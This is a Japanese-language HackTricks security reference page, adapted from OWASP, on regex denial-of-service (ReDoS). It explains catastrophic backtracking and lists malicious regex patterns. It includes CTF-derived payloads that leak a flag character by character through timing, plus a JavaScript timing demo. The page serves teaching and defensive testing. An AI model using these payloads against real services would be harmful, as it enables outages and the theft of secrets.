# 正規表現によるサービス拒否攻撃（ReDoS）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>

## はじめに

**コピー元**：[**https://owasp.org/www-community/attacks/Regular\_expression\_Denial\_of\_Service\_-\_ReDoS**](https://owasp.org/www-community/attacks/Regular\_expression\_Denial\_of\_Service\_-\_ReDoS)

**正規表現によるサービス拒否（ReDoS）**は、ほとんどの正規表現の実装が非常に遅くなる極端な状況に陥る可能性があることを利用した**サービス拒否攻撃**です（入力サイズに指数的に関連しています）。攻撃者は、正規表現を使用するプログラムがこれらの極端な状況に入り、非常に長い時間動作が停止するようにすることができます。

### 説明

#### 問題のある正規表現の素朴なアルゴリズム <a href="#the-problematic-regex-naive-algorithm" id="the-problematic-regex-naive-algorithm"></a>

正規表現の素朴なアルゴリズムは、[非決定性有限オートマトン（NFA）](https://en.wikipedia.org/wiki/Nondeterministic\_finite\_state\_machine)を構築します。NFAは、状態と入力記号の各ペアごとに複数の可能な次の状態が存在する有限状態機械です。その後、エンジンは入力の終わりまで遷移を行います。次の状態が複数あるため、決定的アルゴリズムが使用されます。このアルゴリズムは、一つずつすべての可能なパスを試し（必要な場合）、一致が見つかるまで（またはすべてのパスが試されて失敗するまで）続けます。

例えば、正規表現 `^(a+)+$` は、次のNFAで表されます：

![非決定性有限オートマトン](https://owasp.org/www-community/assets/images/attacks/NFA.png)

入力 `aaaaX` の場合、上記のグラフには16通りの可能なパスがあります。しかし、`aaaaaaaaaaaaaaaaX` の場合、65536通りの可能なパスがあり、`a` を追加するたびに数が倍増します。これは、素朴なアルゴリズムが問題となる極端なケースであり、多くのパスを通過し、最終的に失敗する必要があるためです。

なお、すべてのアルゴリズムが素朴ではなく、実際には効率的な方法で正規表現のアルゴリズムを記述することができます。残念ながら、現在のほとんどの正規表現エンジンは、「純粋な」正規表現だけでなく、「特別な追加要素」を含む「拡張」正規表現も解決しようとします。これらの追加要素には、効率的に解決できないバックリファレンスなどがあります（詳細については、[Wiki-Regex](https://en.wikipedia.org/wiki/Regular\_expression)の「非正規言語のパターン」を参照してください）。そのため、「拡張」されていない場合でも、素朴なアルゴリズムが使用されます。

#### 悪意のある正規表現 <a href="#evil-regexes" id="evil-regexes"></a>

正規表現がクラフトされた入力で停止する場合、その正規表現は「悪意のある」正規表現と呼ばれます。

**悪意のある正規表現パターンには以下が含まれます**：

* 繰り返しを伴うグループ化
* 繰り返しグループ内部：
* 繰り返し
* オーバーラップする選択肢

**悪意のあるパターンの例**：

* `(a+)+`
* `([a-zA-Z]+)*`
* `(a|aa)+`
* `(a|a?)+`
* `(.*a){x} for x \> 10`

上記のすべては、入力 `aaaaaaaaaaaaaaaaaaaaaaaa!` に対して脆弱です（より速いまたは遅いマシンを使用する場合、最小の入力長がわずかに変わる場合があります）。

## ReDoSペイロード

### ReDoSを介した文字列のエクスフィルトレーション

CTF（またはバグバウンティ）では、**機密情報（フラグ）が一致する正規表現を制御**できる場合があります。その場合、**正規表現が一致した場合にページを凍結（タイムアウトまたは長時間処理）**させ、一致しなかった場合には凍結させないと便利です。これにより、文字列を**1文字ずつエクスフィルト**することができます。

* [**この投稿**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)では、次のReDoSルールが見つかります：`^(?=<flag>)((.*)*)*salt$`
* 例：`^(?=HTB{sOmE_fl§N§)((.*)*)*salt$`
* [**この解説**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)では、次のものが見つかります：`<flag>(((((((.*)*)*)*)*)*)*)!`
* [**この解説**](https://ctftime.org/writeup/25869)では、次のものが使用されました：`^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`
### 入力と正規表現の制御による ReDoS

以下は、入力と正規表現の両方を制御する **ReDoS** の例です:
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## ツール

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
